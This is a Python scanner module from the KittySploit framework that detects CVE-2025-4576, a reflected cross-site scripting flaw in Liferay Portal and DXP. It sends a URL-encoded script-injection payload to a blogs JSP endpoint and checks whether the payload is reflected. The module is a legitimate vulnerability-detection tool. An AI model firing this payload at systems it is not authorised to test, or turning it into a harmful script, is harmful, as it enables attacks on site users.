#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Liferay Portal 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Liferay Portal & DXP - Cross-Site Scripting Detection',
        'description': 'Liferay Portal 7.4.0 through 7.4.3.133 and Liferay DXP 2024.Q1.1 through 2025.Q1.4 contain a reflected XSS caused by improper sanitization in entry_cover_image_caption.jsp, letting remote non-authenticated attackers inject JavaScript.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xss', 'liferay', 'portal', 'dxp'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-6qcg-28jh-hm7r',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-4576',
        ],
        'cve': 'CVE-2025-4576',
    }

    def run(self):
        r = self.http_request(method="GET", path='/o/blogs-web/blogs/entry_cover_image_caption.jsp?coverImageURL=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<script>alert(document.domain)</script>', 'background-image',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Liferay Portal & DXP - Cross-Site Scripting detected",
                path='/o/blogs-web/blogs/entry_cover_image_caption.jsp?coverImageURL=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E',
            )
            return True
        return False

